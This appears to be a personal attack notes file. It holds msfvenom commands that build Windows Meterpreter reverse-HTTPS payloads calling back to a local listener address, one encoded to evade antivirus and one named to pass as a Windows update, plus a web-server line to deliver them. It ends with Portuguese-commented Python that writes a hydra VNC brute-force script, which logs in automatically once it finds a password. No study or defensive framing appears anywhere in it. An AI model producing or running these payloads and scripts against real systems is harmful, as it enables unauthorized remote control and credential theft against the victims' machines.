msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

# Gerando o script pronto para brute force VNC + auto connect sem dependência de /mnt/data
script_content = """
import subprocess

ip_alvo = "192.168.1.84"  # Altere para o IP alvo
wordlist_path = "wordlist_atibaia.txt"  # Assuma que o arquivo estará no mesmo diretório

print(f"Iniciando brute force VNC contra {ip_alvo}...\\n")

# Executa brute force via hydra
comando = [
    "hydra",
    "-P", wordlist_path,
    "-t", "4",
    "-f",
    "-V",
    ip_alvo,
    "vnc"
]

resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# Se encontrar a senha no output do hydra
for linha in resultado.stdout.splitlines():
    if "login:" in linha or "host:" in linha:
        print("\\n====> Senha encontrada! Resultado:")
        print(linha)
        
        # Extrair a senha do resultado
        partes = linha.split()
        senha_encontrada = None
        for i, parte in enumerate(partes):
            if parte == "password:":
                senha_encontrada = partes[i+1]
                break

        if senha_encontrada:
            print(f"Tentando abrir conexão automática com vncviewer usando a senha: {senha_encontrada}")
            subprocess.Popen(["vncviewer", ip_alvo, "-passwd", senha_encontrada])
        else:
            print("Senha não pôde ser extraída automaticamente, verifique a saída manualmente.")
        break
else:
    print("Nenhuma senha encontrada ou tentativa falhou.")

print("Brute force VNC concluído.")
"""

with open("/mnt/data/bruteforce_vnc_ready.py", "w") as f:
    f.write(script_content)

print("Script pronto criado como 'bruteforce_vnc_ready.py'.")



